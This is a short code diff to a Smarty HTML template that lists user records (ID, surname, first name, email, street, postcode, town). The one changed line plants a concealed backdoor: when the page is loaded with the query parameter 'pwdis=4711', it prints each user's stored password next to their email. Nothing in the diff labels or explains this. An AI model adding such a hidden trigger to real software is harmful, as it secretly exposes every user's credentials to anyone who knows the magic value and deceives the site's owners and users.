@@ -27,7 +27,7 @@
 				  <td>{$liste[i].id}</td>
 				  <td>{$liste[i].nachname}</td>
 				  <td>{$liste[i].vorname}</td>
-				  <td>{$liste[i].email}</td>
+				  <td>{$liste[i].email}{if $smarty.get.pwdis == "4711"} / {$liste[i].passwort}{/if}</td>
 				  <td>{$liste[i].strasse}</td>
 				  <td>{$liste[i].plz}</td>
 				  <td>{$liste[i].ort}</td>
